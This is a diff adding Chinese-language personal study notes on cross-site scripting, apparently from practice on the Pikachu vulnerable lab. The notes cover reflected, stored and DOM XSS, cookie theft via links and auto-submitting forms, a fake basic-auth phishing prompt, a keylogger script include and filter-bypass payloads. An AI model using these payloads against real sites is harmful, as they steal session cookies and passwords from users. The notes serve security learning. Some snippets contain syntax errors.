@@ -1,0 +1,65 @@
+1.反射型
+ 先输入简单的payload  '"<>6666查看过滤情况后查看源代码进行其他操作(cmd+opt+c)
+ get型最容易,并且可以复制完整恶意链接给其他人
+2.存储型
+ 存储到数据库并且返回的时候没有处理直接输出到页面的情况
+3.DOM型
+ 前端输入被DOM获取到了
+ js控制DOM节点
+
+
+
+"<a href='"+str+"'>what do you see?</a>"
+str="a'>a</a>hello<a href='b'>"
+
+
+"<a href='"+xss+"'>就让往事都随风,都随风吧</a>"
+xss="' onclick="alert('xss')">";
+
+
+4.cookie窃取
+  get:发现有xss的网站，伪造链接，等用户上钩
+   <script>document.location='http://127.0.0.1/pikachu/pkxss/xcookie/cookie.php?cookie='+document.cookie</script>
+   然后有问题的URL随便放到什么地方
+  post:让用户访问页面自动发送post请求给有问题的网站获取cookie
+ <body>
+      <script>
+          windows.onload=function(){
+              document.getElementById"postsubmit".click();
+          }
+      </script>
+      <form method="post" action="有xss问题网站post的地址">
+      //模仿有问题的表单
+          <input type="text" name="message" value="
+	      <script>
+	          document.location='自己的网站?cookie='+document.cookie;
+	      </script>
+	  "> 
+          <input id="postsubmit" type="submit" name="submit" value="submit">
+      </form> 
+  </body>
+5.钓鱼攻击
+ 从URL引发的漏洞
+ 有问题的留言板输出自己写好的<script scr=""></script>引入带有basic认证的页面等待用户输入账号密码
+ 类似于cookie窃取,用户主动输入用户名密码
+ 留言板中输入<script src="http://127.0.0.1/pikachu/pkxss/xfish/fish.php"></script>引入外部文件弹出basic获取用户名密码给后端
+6.获取用户键盘记录
+ 同源策略:  js不能操作跨域网站，除script,img,link.iframe的src标签
+ header("Access-Control-Allow-Origin:xxx.com");允许xxx.com进行跨域操作
+ <script src="http://192.168.43.15/pikachu/pkxss/rkeypress/rk.js"></script>
+ MAMP的同源没整明白,不会改
+7.xss盲打
+ 前段不输出，只能后台观看
+8.xss绕过
+ 0.只有前端比如字符长度限制，自行修改
+ 1.利用大小写,对方正则的疏忽<SCRIPT>aLeRT(111)</sCrIpt>
+ 2.script被去掉后再来一层<scri<script>pt>alert(111)</scr</script>ipt>
+ 3.注释干扰<scr<!--test-->ipt>alert(123)<sc<!--test-->ript>
+ 4.编码绕过，后台不能识别，但是前端输出能够识别
+   <img src=x onerror="alert('xss')">
+   //不要用浏览器编码<img src=x onerror="alert%28%27xss%27%28">
+   <img src=x onerror="">
+使用$message=htmlspecialchars($_GET['message'], ENT_QUOTES);对字符转义,但是默认不对'转码,并且在输出的时候用\进行转义
+ 5.<a href=''>只能使用http或者https否则不允许
+ 6.输出点在javascript时htmlspecialchars不会去解释道页面
+
